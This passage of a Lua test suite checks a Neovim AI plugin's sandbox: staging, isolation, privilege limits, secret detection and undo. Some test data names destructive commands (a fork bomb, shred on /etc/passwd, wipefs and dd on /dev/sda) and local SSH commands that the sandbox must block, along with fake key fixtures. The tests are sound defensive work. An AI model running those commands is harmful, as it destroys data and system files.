    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run" } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "base\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "agent\n", description = "t",
      }, {}):then_(function()
        -- 模拟发布前他人修改真实工作区
        fs.write_file(p, "human\n")
        local cand = sandbox.list()[1]
        local res = sandbox.commit(cand.candidate_digest)
        t.false_(res.ok, "基线变化应 CAS 失败")
        t.eq("CONFLICT", res.state)
        t.eq("human", trim(fs.read_file(p)), "不得覆盖他人修改")
        fs.delete_file(p)
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
  end)

  it("buffer 写盘工具 dry_run 不落真实磁盘", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run" } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".lua"
      fs.write_file(p, "local keep = 1\nlocal remove = 2\n")
      local done = false
      require("NeoAI.tools").execute("delete_node", {
        filepath = p, line = 2, col = 1, description = "t",
      }, {}):then_(function()
        t.matches("remove", fs.read_file(p) or "", "dry_run 下真实文件不应被删除节点")
        local list = sandbox.list()
        t.eq(1, #list, "应冻结候选")
        fs.delete_file(p)
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(3000, function() return done end), "delete_node 应完成")
    end)
  end)

  it("运行时：能力探测与隔离进程执行", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local caps = runtime.probe()
    t.true_(caps.bwrap or caps.unshare, "应至少有一种隔离工具")
    local backend = runtime.backend()
    t.not_nil(backend, "auto 应选出一个可用后端")
    if backend then
      local done = false
      runtime.run({ "sh", "-c", "echo isolated-ok" }, { timeout_ms = 5000 }):then_(function(r)
        t.eq(0, r.code, "隔离命令应成功: " .. tostring(r.stderr))
        t.matches("isolated%-ok", r.stdout or "")
        done = true
      end, function(e)
        t.true_(false, "隔离执行不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(8000, function() return done end), "隔离进程应完成")
    end
  end)

  it("runtime：后端可用时构造前缀，不可用时返回明确错误", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local prefix, err = runtime.process_prefix({})
    if runtime.backend() == nil then
      t.nil_(prefix)
      t.matches("SANDBOX_BACKEND_UNAVAILABLE", tostring(err))
    else
      t.not_nil(prefix, "有后端时应能构造前缀")
      t.eq("table", type(prefix))
      t.eq(nil, err)
    end
  end)

  it("隐匿：进程前缀含 --as-pid-1 且不暴露沙箱自有路径", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local conceal = require("NeoAI.sandbox.conceal")
    if runtime.backend() ~= "bwrap" then return end
    local prefix = runtime.process_prefix({ cwd = "/tmp", session_dir = "/tmp/neoai_sess" })
    t.not_nil(prefix, "应能构造前缀")
    local joined = table.concat(prefix, " ")
    t.true_(joined:find("--as-pid-1", 1, true) ~= nil, "应使用 --as-pid-1 隐藏 bwrap 进程")
    t.true_(joined:find("NeoAI-sandbox", 1, true) == nil, "前缀不应含 NeoAI-sandbox")
    t.true_(joined:find(".neoai_session", 1, true) == nil, "前缀不应含旧会话挂载点")
    t.true_(joined:find(conceal.session_mount(), 1, true) ~= nil, "应使用无特征会话挂载点")
    -- root 且免 userns 时不应出现 --unshare-all（uid_map / ns-user 指纹）
    if runtime.capabilities().userns_free then
      t.true_(joined:find("--unshare-all", 1, true) == nil, "免 userns 时不应含 --unshare-all")
      t.true_(joined:find("--unshare-user", 1, true) == nil, "免 userns 时不应含 --unshare-user")
    end
  end)

  it("隐匿：overlay 基目录与会话挂载点无特征命名", function(t)
    local conceal = require("NeoAI.sandbox.conceal")
    if vim.fn.isdirectory("/dev/shm") == 1 and vim.fn.filewritable("/dev/shm") == 2 then
      t.true_(not conceal.base_host():find("NeoAI", 1, true), "基目录不应含 NeoAI")
      t.true_(not conceal.base_host():find("sandbox", 1, true), "基目录不应含 sandbox")
    end
    t.true_(not conceal.session_basename():find("neoai", 1, true), "会话名不应含 neoai")
  end)

  it("加固：默认最小权限（cap-drop ALL + 主机全局能力收敛），可显式放宽", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local file = dir .. "/secret.sock"
    fs.write_file(file, "")
    -- 默认：最小权限（--cap-drop ALL），并按 cap_drop 额外收敛主机全局能力；
    -- 读取面靠遮蔽 + 只读根收敛，写入靠 overlay 暂存。
    with_config({ tools = { sandbox = { mask_paths = { dir, file } } } }, function()
      local prefix = runtime.process_prefix({ cwd = "/tmp" })
      t.not_nil(prefix, "应能构造前缀")
      local joined = table.concat(prefix, " ")
      t.true_(joined:find("--cap-drop ALL", 1, true) ~= nil, "默认应丢弃全部 capability（最小权限）")
      t.true_(joined:find("--cap-drop CAP_NET_ADMIN", 1, true) ~= nil, "应丢弃 CAP_NET_ADMIN（禁 netlink 改宿主网络）")
      t.true_(joined:find("--cap-drop CAP_SYS_TIME", 1, true) ~= nil, "应丢弃 CAP_SYS_TIME（禁改宿主时钟）")
      t.true_(joined:find("--cap-drop CAP_SYS_MODULE", 1, true) ~= nil, "应丢弃 CAP_SYS_MODULE")
      t.true_(joined:find("--cap-drop CAP_SYS_RAWIO", 1, true) ~= nil, "应丢弃 CAP_SYS_RAWIO")
      t.true_(joined:find("--cap-add", 1, true) == nil, "默认不应逐项 cap-add")
      t.true_(joined:find("--tmpfs " .. dir, 1, true) ~= nil, "目录应以空 tmpfs 遮蔽")
      t.true_(joined:find("--bind /dev/null " .. file, 1, true) ~= nil, "文件/socket 应以 /dev/null 遮蔽")
    end)
    -- 显式放宽：cap_add = { "ALL" } → 不 --cap-drop ALL
    with_config({ tools = { sandbox = { cap_add = { "ALL" } } } }, function()
      local prefix = runtime.process_prefix({ cwd = "/tmp" })
      local joined = table.concat(prefix, " ")
      t.true_(joined:find("--cap-drop ALL", 1, true) == nil, "cap_add={ALL} 应保留完整能力")
    end)
    -- 显式列出被丢弃的能力时以显式为准（不重复 drop）
    with_config({ tools = { sandbox = { cap_add = { "ALL", "CAP_NET_ADMIN" } } } }, function()
      local prefix = runtime.process_prefix({ cwd = "/tmp" })
      local joined = table.concat(prefix, " ")
      t.true_(joined:find("--cap-drop CAP_NET_ADMIN", 1, true) == nil, "显式列出的能力不应被 cap_drop 覆盖")
    end)
    -- 档位能力：T2 嵌套 userns 内完整能力（caps 被 userns 作用域限制）
    local privilege = require("NeoAI.sandbox.privilege")
    local t2 = privilege.resolve(2, { tier = 2, network = true })
    t.true_(t2.ok, "T2 应可解析")
    with_config({ tools = { sandbox = {} } }, function()
      local pre2 = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = t2.privileges }), " ")
      t.true_(pre2:find("--cap-drop ALL", 1, true) == nil, "T2 应保留完整能力（userns 内作用域受限）")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("最小权限：载荷默认以非 root 运行（root 启动用 run_as + setpriv 降权）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    with_config({ tools = { sandbox = { run_as = { uid = 65534, gid = 65534 } } } }, function()
      local prefix = runtime.process_prefix({ cwd = "/tmp" })
      t.not_nil(prefix, "应能构造前缀")
      local joined = table.concat(prefix, " ")
      if vim.uv.getuid() == 0 then
        -- root 启动：bwrap 保持 root 完成挂载，载荷经 setpriv 降权（不用 bwrap --uid，
        -- 否则 guest 会映射到宿主 root，是 root 伪装）。
        t.true_(joined:find("setpriv", 1, true) ~= nil, "root 启动应以 setpriv 降权载荷")
        t.true_(joined:find("--reuid 65534", 1, true) ~= nil, "应把载荷降为 uid 65534")
        t.true_(joined:find("--uid 65534", 1, true) == nil, "root 启动不应使用 bwrap --uid")
      else
        -- 非 root 启动：用 userns 把当前用户映射为沙箱内 guest root（euid=0），宿主仍非 root。
        t.true_(joined:find("--uid 0", 1, true) ~= nil, "非 root 启动应把沙箱内载荷映射为 root(uid 0)")
        t.true_(joined:find("--unshare-user", 1, true) ~= nil or joined:find("--unshare-all", 1, true) ~= nil,
          "非 root 载荷需要 user namespace 承载 --uid/--gid")
      end
    end)
    -- 显式放弃降权（uid=0）：不注入 --uid / setpriv（保持以 root 运行载荷）。
    with_config({ tools = { sandbox = { run_as = { uid = 0, gid = 0 } } } }, function()
      local prefix = runtime.process_prefix({ cwd = "/tmp" })
      local joined = table.concat(prefix, " ")
      t.true_(joined:find("--uid", 1, true) == nil, "uid=0 不应注入 --uid")
      t.true_(joined:find("setpriv", 1, true) == nil, "uid=0 不应 setpriv")
    end)
  end)

  it("只读 mount 列举不算特权；变更型 mount 仍为 T2", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local spec = { effect = "process" }
    for _, cmd in ipairs({
      "mount",
      "mount -l",
      "mount --show-labels",
      "mount -t ext4",
      "findmnt -no OPTIONS -T /root",
      "mount | grep -E ' / '",
      "ls -la; mount | head",
    }) do
      t.eq(0, privilege.classify("run_command", { command = cmd }, spec).tier,
        "只读 mount 不应升级档位: " .. cmd)
    end
    for _, cmd in ipairs({
      "mount /dev/sdb1 /mnt",
      "mount -a",
      "mount -o remount /",
      "umount /mnt",
    }) do
      t.eq(2, privilege.classify("run_command", { command = cmd }, spec).tier,
        "变更型 mount 应为 T2: " .. cmd)
    end
  end)

  it("T2 嵌套 userns 不追加 setpriv（避免未映射 uid EINVAL）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local privilege = require("NeoAI.sandbox.privilege")
    if runtime.backend() ~= "bwrap" then return end
    local t2 = privilege.resolve(2, { tier = 2, network = true })
    t.true_(t2.ok, "T2 应可解析")
    with_config({ tools = { sandbox = { run_as = { uid = 65534, gid = 65534 } } } }, function()
      local prefix = runtime.process_prefix({ cwd = "/tmp", privileges = t2.privileges })
      t.not_nil(prefix, "应能构造 T2 前缀")
      local joined = table.concat(prefix, " ")
      if vim.uv.getuid() == 0 then
        t.true_(joined:find("--unshare-all", 1, true) ~= nil, "T2 应使用嵌套 userns")
        t.true_(joined:find("setpriv", 1, true) == nil,
          "T2 userns 内不应 setpriv（run_as.uid 未映射，会 EINVAL）")
      end
    end)
  end)

  it("最小权限：实际执行以非 root 身份（id -u == run_as.uid）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" or vim.uv.getuid() ~= 0 then return end
    if vim.fn.executable("setpriv") ~= 1 then return end
    local sandbox = require("NeoAI.sandbox")
    -- 工作区须可被非 root 载荷遍历：用 /tmp 下的临时目录（真实部署中工作区归用户所有）。
    -- 注意不能用 vim.fn.tempname()（位于 /tmp/nvim.<user>，0700，非 root 不可遍历）。
    local ws = "/tmp/neoai-nr-" .. tostring(os.time()) .. "-" .. tostring(vim.fn.getpid())
    require("NeoAI.utils.fs").ensure_dir(ws)
    pcall(vim.uv.fs_chmod, ws, 493) -- 0755
    -- 沙箱存储根也须可被载荷遍历（默认在 /root 下，root 启动 + 专用 uid 时不可达）。
    local store_root = ws .. "/store"
    require("NeoAI.utils.fs").ensure_dir(store_root)
    pcall(vim.uv.fs_chmod, store_root, 493)
    local saved_cwd = vim.fn.getcwd()
    vim.cmd("cd " .. vim.fn.fnameescape(ws))
    local ok, err = pcall(function()
      with_config({ tools = { approval = { mode = "async" }, sandbox = {
        run_as = { uid = 65534, gid = 65534 }, mode = "dry_run", review = { enabled = true },
        workspace_root = store_root,
      } } }, function()
        sandbox.reset()
        local done, out = false, nil
        require("NeoAI.tools").execute("run_command", { command = "id -u", description = "t" }, {})
          :then_(function(r) out = tostring(r); done = true end,
            function(e) out = "ERR:" .. tostring(e and e.message or e); done = true end)
      t.true_(vim.wait(10000, function() return done end), "命令应完成")
      t.matches("65534", out, "载荷应以 uid 65534 运行（实际: " .. tostring(out) .. "）")
      -- 会话 shell 状态目录须可被非 root 载荷写入（cwd/env），否则命令会报
      -- `cannot create .../cwd: Permission denied`。
      t.true_(not tostring(out):find("Permission denied", 1, true),
        "会话状态目录不应有权限错误（实际: " .. tostring(out) .. "）")
    end)
    end)
    vim.cmd("cd " .. vim.fn.fnameescape(saved_cwd))
    vim.fn.delete(ws, "rf")
    if not ok then error(err, 0) end
  end)

  it("落盘：先非 root 尝试，权限不足 → NEEDS_ROOT；批准后以 root 写入", function(t)
    local writer = require("NeoAI.sandbox.writer")
    if vim.uv.getuid() ~= 0 then return end
    local fs = require("NeoAI.utils.fs")
    local dir = "/tmp/neoai-writer-" .. tostring(os.time()) .. "-" .. tostring(vim.fn.getpid())
    fs.ensure_dir(dir)
    pcall(vim.uv.fs_chmod, dir, 493) -- 0755（root 属主，非 root 不可写）
    local target = dir .. "/f.txt"
    with_config({ tools = { sandbox = { run_as = { uid = 65534, gid = 65534 } } } }, function()
      local res = writer.apply("write", target, "hi\n", {})
      t.eq(writer.STATE.NEEDS_ROOT, res.state, "非 root 不可写应返回 NEEDS_ROOT")
      t.true_(vim.uv.fs_stat(target) == nil, "未批准时不应写入真实盘")
      local res2 = writer.apply("write", target, "hi\n", { allow_root = true })
      t.true_(res2.ok, "批准后应写入: " .. tostring(res2.err))
      t.eq("root", res2.writer, "批准后应以 root 写入")
      t.eq("hi\n", fs.read_file(target))
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("权限：permission denied / read-only 触发提权建议（全档位）", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local esc = privilege.detect_escalation({ code = 1, stderr = "touch: cannot touch '/x': Permission denied" })
    t.not_nil(esc, "permission denied 应触发提权建议")
    t.eq(privilege.TIER.PRIVILEGED, esc.tier)
    local esc2 = privilege.detect_escalation({ code = 1, stderr = "Read-only file system" })
    t.not_nil(esc2, "read-only 应触发提权建议")
  end)

  it("风险：危险指令（fork bomb / shred / wipefs）判为 L3 且默认待审", function(t)
    local risk = require("NeoAI.sandbox.risk")
    local cmds = { ":(){ :|:& };:", "shred -u /etc/passwd", "wipefs -a /dev/sda", "dd if=/dev/zero of=/dev/sda" }
    for _, cmd in ipairs(cmds) do
      local r = risk.classify({ command = cmd, tool = "run_command" })
      t.eq(3, r.level, "应判 L3: " .. cmd)
      t.eq("review", risk.action(r.level, {}), "默认应进入待审: " .. cmd)
    end
  end)

  it("安全：禁止访问本机 SSH 服务（命令级硬拒绝 + agent 遮蔽 + 环境清除）", function(t)
    local risk = require("NeoAI.sandbox.risk")
    local runtime = require("NeoAI.sandbox.runtime")
    for _, cmd in ipairs({
      "ssh root@localhost", "scp a 127.0.0.1:/x", "sftp ::1",
      "git clone ssh://127.0.0.1/repo", "sshpass -p x ssh localhost",
    }) do
      local denied = risk.ssh_local_target(cmd)
      t.true_(denied, "应拒绝本机 SSH: " .. cmd)
    end
    t.false_(risk.ssh_local_target("ssh user@example.com"), "远端 ssh 不应拒绝")
    t.false_(risk.ssh_local_target("ls -la"), "非 ssh 命令不应拒绝")
    with_config({ tools = { sandbox = {} } }, function()
      t.not_nil(runtime.is_masked_path("/run/sshd"), "应遮蔽 sshd 运行目录")
      t.not_nil(runtime.is_masked_path("/run/ssh-agent.socket"), "应遮蔽 ssh-agent socket")
      local sn = runtime.proxy_unset_snippet()
      t.matches("SSH_AUTH_SOCK", sn or "", "应清除 SSH_AUTH_SOCK")
    end)
  end)

  it("密钥：AI 生成的高熵内容被识别（生成私钥/随机 token 需关注）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local key_line = string.rep("MIIEowIBAAKCAQEA", 4)
    local files = {
      { path = "/tmp/gen.key", content = "-----BEGIN RSA PRIVATE KEY-----\n" .. key_line .. "\n-----END RSA PRIVATE KEY-----\n" },
      { path = "/tmp/tok.txt", content = "token=Zx9Qw2Lm7Pk4Rt8Yv3Bn6Hd1Sg5Jf0Ac\n" },
      { path = "/tmp/plain.txt", content = "hello world, no secrets here\n" },
    }
    local hits = secret.detect_generated(files)
    t.true_(#hits >= 2, "应识别生成的高熵/私钥内容，实际: " .. vim.inspect(hits))
    -- 宿主密钥的加密 token（NEOKEY_*）不应被当作「AI 生成密钥」
    local h2 = secret.detect_generated({ { path = "/x", content = "k=NEOKEY_deadbeefcafebabe\n" } })
    t.eq(0, #h2, "NEOKEY token 不应计入生成高熵")
  end)

  it("密钥：生成检测受扫描预算约束（大候选不占满主线程）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    with_config({ tools = { sandbox = { secrets = { generated_scan_max_files = 1 } } } }, function()
      local files = {
        { path = "/tmp/a.key", content = "token=Zx9Qw2Lm7Pk4Rt8Yv3Bn6Hd1Sg5Jf0Ac\n" },
        { path = "/tmp/b.key", content = "token=Ab1Cd2Ef3Gh4Ij5Kl6Mn7Op8Qr9St0Uv\n" },
      }
      local hits = secret.detect_generated(files)
      t.eq(1, #hits, "超出扫描预算的文件不应被扫描")
    end)
  end)

  it("密钥：异步分析结果与同步一致（工作线程）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local files = {
      { path = "/tmp/a.key", content = "token=Zx9Qw2Lm7Pk4Rt8Yv3Bn6Hd1Sg5Jf0Ac\n" },
      { path = "/tmp/b.key", content = "-----BEGIN RSA PRIVATE KEY-----\n"
        .. string.rep("MIIEowIBAAKCAQEA", 4) .. "\n-----END RSA PRIVATE KEY-----\n" },
      { path = "/tmp/plain.txt", content = "hello world, nothing to see\n" },
    }
    return secret.analyze_files_async(files):then_(function(r)
      if r.offloaded == false then return end -- 无 worker：跳过（同步版已另有覆盖）
      local sw = secret.warn_for_files(files)
      t.eq(sw and sw.count or 0, r.warning and r.warning.count or 0, "token 计数应与同步一致")
      t.eq(#secret.detect_generated(files), #r.generated, "生成高熵命中数应与同步一致")
    end)
  end)

  it("存储：异步写入立即可读且 flush 后落盘", function(t)
    local store = require("NeoAI.sandbox.store")
    local root = vim.fn.tempname()
    vim.fn.mkdir(root, "p")
    store.init(root)
    local cand = {
      candidate_digest = "sha256:async1", created_at = 1,
      files = { { path = "/tmp/x", content = "hello" } },
    }
    local done = false
    store.write_candidate_async(cand):then_(function()
      t.not_nil(store.read_candidate("sha256:async1"), "写入后应立即可读（内存缓存）")
      local listed = false
      for _, c in ipairs(store.list_candidates()) do
        if c.candidate_digest == "sha256:async1" then listed = true end
      end
      t.true_(listed, "列表应包含异步写入的候选")
      t.true_(store.flush(2000), "flush 应完成")
      t.eq(1, vim.fn.filereadable(root .. "/candidates/sha256_async1.json"), "flush 后应落盘")
      done = true
    end, function(e)
      t.true_(false, tostring(e and e.message or e)); done = true
    end)
    t.true_(vim.wait(3000, function() return done end), "应完成")
    store.reset()
  end)

  it("加固：只读白名单可配置且跳过不存在项", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local file = dir .. "/keep.conf"
    fs.write_file(file, "x")
    with_config({ tools = { sandbox = {
      read_all = false,
      readonly_roots = { dir },
      readonly_paths = { file, dir .. "/missing.conf" },
    } } }, function()
      local joined = table.concat(runtime.append_readonly({}), " ")
      t.true_(joined:find("--ro-bind " .. dir .. " " .. dir, 1, true) ~= nil, "应只读暴露配置的根")
      t.true_(joined:find("--ro-bind " .. file .. " " .. file, 1, true) ~= nil, "应只读暴露配置的文件")
      t.true_(joined:find("missing.conf", 1, true) == nil, "不存在项应跳过")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("加固：读取面收敛（/usr 不整目录暴露，/var/lib 与 /usr/share 只读暴露）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    with_config({ tools = { sandbox = { read_all = false } } }, function()
    local prefix = runtime.process_prefix({ cwd = "/tmp" })
    t.not_nil(prefix, "应能构造前缀")
    local joined = table.concat(prefix, " ")
    t.true_(joined:find("--ro-bind / /", 1, true) == nil, "不应再整机只读根")
    t.true_(joined:find("--ro-bind /usr /usr ", 1, true) == nil, "不应整目录暴露 /usr")
    t.true_(joined:find("--ro-bind /usr/bin /usr/bin", 1, true) ~= nil, "应白名单暴露 /usr/bin")
    t.true_(joined:find("--ro-bind /usr/lib /usr/lib", 1, true) ~= nil, "应白名单暴露 /usr/lib")
    t.true_(joined:find("--ro-bind /usr/share /usr/share", 1, true) ~= nil, "应只读暴露 /usr/share")
    t.true_(joined:find("--ro-bind /var/lib /var/lib", 1, true) ~= nil, "应只读暴露 /var/lib")
    local cmd = {}
    for _, v in ipairs(prefix) do cmd[#cmd + 1] = v end
    for _, v in ipairs({ "/bin/sh", "-c",
      "if [ -e /home ]; then echo LEAK_HOME; fi; "
      .. "if [ -s /etc/shadow ]; then echo LEAK_SHADOW; fi; "
      .. "if [ -s /etc/machine-id ]; then echo LEAK_MACHINEID; fi; "
      .. "if [ -n \"$(ls -A /var/log 2>/dev/null)\" ]; then echo LEAK_VARLOG; fi; "
      .. "if [ -e /usr/local/go_workspace ]; then echo LEAK_GOWORKSPACE; fi; "
      .. "if [ -e /usr/src ]; then echo LEAK_USRSRC; fi; "
      .. "if [ -d /usr/share ] && [ -d /var/lib ]; then echo VISIBLE_OK; fi; "
      .. "echo READ_CONVERGED",
    }) do cmd[#cmd + 1] = v end
    local out = vim.fn.system(cmd)
    t.true_(out:find("READ_CONVERGED", 1, true) ~= nil, "命令应完成，实际: " .. tostring(out))
    t.true_(out:find("LEAK_", 1, true) == nil, "不应泄露宿主敏感路径，实际: " .. tostring(out))
    t.true_(out:find("VISIBLE_OK", 1, true) ~= nil, "/var/lib 与 /usr/share 应可见，实际: " .. tostring(out))
    end)
  end)

  it("加固：read_all 整机只读暴露，mask_paths 仍遮蔽、mask_dirs 不遮蔽", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    with_config({ tools = { sandbox = { read_all = true } } }, function()
      t.true_(runtime.read_all(), "read_all 默认开")
      local joined = table.concat(runtime.process_prefix({ cwd = "/tmp" }), " ")
      t.true_(joined:find("--ro-bind / /", 1, true) ~= nil, "应整机只读暴露")
      -- 重要配置文件（mask_paths）仍遮蔽
      t.true_(joined:find("--tmpfs /root/.ssh", 1, true) ~= nil, "mask_paths 应仍遮蔽 /root/.ssh")
      -- mask_dirs（home/root 兄弟目录）不再挂载遮蔽
      t.true_(joined:find("--tmpfs /root/neoai", 1, true) == nil, "mask_dirs 不应再遮蔽兄弟目录")
    end)
  end)

  it("越界访问判定：cwd 之外的用户目录命中，cwd 子树/系统路径不命中", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    t.eq("/root/other/x", runtime.outside_workspace("/root/other/x", "/root/proj"), "cwd 外 home 路径应命中")
    t.nil_(runtime.outside_workspace("/root/proj/a.lua", "/root/proj"), "cwd 子树不命中")
    t.nil_(runtime.outside_workspace("/usr/bin/ls", "/root/proj"), "系统路径不命中")
  end)

  it("越界访问留痕：read_file 访问 cwd 外用户目录被记录（非阻塞）", function(t)
    local sandbox = require("NeoAI.sandbox")
    local fs = require("NeoAI.utils.fs")
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run", read_all = true } } }, function()
      sandbox.reset()
      local target = vim.fn.expand("~") .. "/.bashrc"
      if not fs.exists(target) then return end
      local done = false
      require("NeoAI.tools").execute("read_file", { filepath = target, description = "r" }, {})
        :then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(8000, function() return done end), "应完成")
      local traces = sandbox.list_traces()
      t.true_(#traces >= 1, "应记录越界访问")
      local found = false
      for _, it in ipairs(traces) do
        if it.tool == "read_file" and it.path:find(".bashrc", 1, true) then found = true end
      end
      t.true_(found, "应记录 read_file 的越界路径")
    end)
  end)

  it("越界访问留痕：按文件合并/排序，去重文件计数", function(t)
    local trace = require("NeoAI.sandbox.trace")
    trace.reset()
    trace.record({ tool = "list_files", path = "/root/z.txt" })
    trace.record({ tool = "read_file", path = "/root/a.txt" })
    trace.record({ tool = "list_files", path = "/root/a.txt" })
    trace.record({ tool = "read_file", path = "/root/a.txt" })
    local grouped = trace.list_grouped()
    t.eq(2, #grouped, "应按路径去重为 2 个文件")
    t.eq("/root/a.txt", grouped[1].path, "应按路径升序（a 在前）")
    t.eq("/root/z.txt", grouped[2].path)
    t.eq(2, grouped[1].count, "同路径记录应合并（record 按 tool+path 去重）")
    t.deep_eq({ "read_file", "list_files" }, grouped[1].tools, "工具名应去重合并（首现顺序）")
    t.eq(2, trace.file_count(), "file_count 应为去重文件数")
    trace.reset()
  end)

  it("保存/撤销保存：交换原文件与快照，可反复切换且冲突时拒绝", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. "_undo.txt"
      fs.write_file(p, "base\n")
      local id, done = nil, false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "next\n", description = "t",
      }, {}):then_(function()
        local items = sandbox.list_reviews({ review_state = "PENDING" })
        t.eq(1, #items, "应有一个待审单元")
        id = items[1].change_set_id
        local res = sandbox.apply(id, { auto_approve = true })
        t.true_(res.ok, tostring(res.reason))
        t.eq("next", trim(fs.read_file(p)), "应用后应为新内容")
        local saved = sandbox.list_saved()
        t.eq(1, #saved, "应有 1 个已保存项")
        t.eq("APPLIED", saved[1].apply_state, "应为已保存状态")
        t.eq(p, saved[1].saved_files and saved[1].saved_files[1] and saved[1].saved_files[1].path,
          "快照应附带文件清单")

        -- 撤销保存：真实文件与快照交换 → 恢复原内容
        local u = sandbox.undo(id)
        t.true_(u.ok, tostring(u.reason))
        t.eq("REVERTED", u.state, "撤销后状态应为 REVERTED")
        t.eq("base", trim(fs.read_file(p)), "撤销后应恢复原内容")

        -- 再次撤销（重做保存）：交换回来 → 新内容
        local r = sandbox.undo(id)
        t.true_(r.ok, tostring(r.reason))
        t.eq("APPLIED", r.state, "重做后状态应为 APPLIED")
        t.eq("next", trim(fs.read_file(p)), "重做后应为新内容")

        -- 外部改动后撤销应冲突（拒绝覆盖用户改动）
        fs.write_file(p, "external\n")
        local c = sandbox.undo(id)
        t.false_(c.ok, "外部改动后撤销应失败")
        t.eq("CONFLICT", c.state, "应为 CONFLICT")
        t.eq("external", trim(fs.read_file(p)), "冲突时不应覆盖用户改动")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "应完成")
      fs.delete_file(p)
    end)
  end)

  it("临时根（ephemeral_roots）：/tmp 写入不产生待审候选、不落真实盘、读取一致", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = {
      mode = "dry_run", review = { enabled = true }, ephemeral_roots = { "/tmp" },
    } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. "_eph.txt"
      pcall(fs.delete_file, p)
      local done = false
      require("NeoAI.tools").execute("edit_file",
        { filepath = p, description = "t", mode = "write", content = "eph\n" }, {}):then_(function()
          t.false_(fs.exists(p), "临时根写入不应落到真实磁盘")
          t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "临时根不应产生待审候选")
          done = true
        end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(8000, function() return done end), "edit_file 应完成")
      local done2, out = false, nil
      require("NeoAI.tools").execute("read_file", { filepath = p, description = "r" }, {})
        :then_(function(r) out = tostring(r); done2 = true end, function() done2 = true end)
      t.true_(vim.wait(8000, function() return done2 end), "read_file 应完成")
      t.matches("eph", out or "", "读取应看到临时根内容（暂存一致）")
    end)
  end)

  it("工具子进程：写入经 overlay 暂存为候选（不直接落盘）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    local exec = require("NeoAI.sandbox.exec")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_exec_stage"):gsub("/+$", "")
      vim.fn.mkdir(dir, "p")
      local real_file = dir .. "/out.txt"
      pcall(os.remove, real_file)
      local done, result = false, nil
      exec.run({ "bash", "-c", "echo STAGED > " .. real_file }, {
        name = "probe", writable_roots = { dir }, network = false, timeout_ms = 20000,
      }):then_(function(res) result = res; done = true end, function() done = true end)
      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
      t.true_(result and result.code == 0, "命令应成功")
      t.eq(0, vim.fn.filereadable(real_file), "真实文件不应落盘（已暂存）")
      local staged = require("NeoAI.sandbox.candidate").read_path(real_file)
      t.not_nil(staged, "应存在暂存副本")
      local f = staged and io.open(staged)
      local content = f and f:read("*a") or ""
      if f then f:close() end
      t.matches("STAGED", content, "暂存副本应含写入内容")
      t.true_(sandbox.pending_count() >= 1, "应进入待审队列")
      pcall(vim.fn.delete, dir, "rf")
    end)
  end)

  it("工具子进程：沙箱禁用且 fail_closed 时拒绝", function(t)
    local exec = require("NeoAI.sandbox.exec")
    with_config({ tools = { sandbox = { enabled = false, fail_closed = true } } }, function()
      local full, finish, err = exec.open({ "true" }, { network = true })
      t.eq(nil, full, "应拒绝执行")
      t.eq(nil, finish, "不应返回结束回调")
      t.not_nil(err, "应给出拒绝原因")
